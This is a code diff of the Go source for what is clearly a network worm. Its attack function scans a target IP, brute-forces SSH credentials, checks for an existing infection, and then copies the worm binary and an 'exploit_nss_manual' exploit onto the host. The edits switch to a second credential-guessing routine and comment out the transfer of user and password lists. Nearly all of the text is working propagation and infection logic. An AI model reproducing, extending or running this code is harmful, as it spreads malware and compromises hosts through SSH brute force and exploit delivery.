@@ -12,7 +12,7 @@ import (
 
 func attack(wg *sync.WaitGroup, id int, ip string) {
 	attackerString := fmt.Sprintf("Attacker %d: ",id)
-	
+
 	fmt.Println(attackerString + ip)
 	ports := scan.ScanIp(ip)
 	fmt.Println(ports)
@@ -27,7 +27,7 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 	//SSH infect
 	if !infected && ports[1] != 0 {
 		ip_port := ip + ":" + strconv.Itoa(ports[1])
-		hit_credentials := infection.GuessSSHConnection(ip_port)
+		hit_credentials := infection.GuessSSHConnectionV2(ip_port)
 		if hit_credentials{
 			is_infected := infection.SshCheckInfection(ip_port)
 			fmt.Println(is_infected)
@@ -35,8 +35,9 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 				return
 			}
 			message := infection.SshInfect(ip_port, "worm")
-			message = infection.SshInfect(ip_port, "users.txt")
-			message = infection.SshInfect(ip_port, "passwords.txt")
+			//We don't transfer the users and passwords because we are using the constants
+			//message = infection.SshInfect(ip_port, "users.txt")
+			//message = infection.SshInfect(ip_port, "passwords.txt")
 			//message = infection.SshInfect(ip_port, "slowloris")
 			//message = infection.SshInfect(ip_port, "exploit_nss.py")
 			message = infection.SshInfect(ip_port, "exploit_nss_manual")
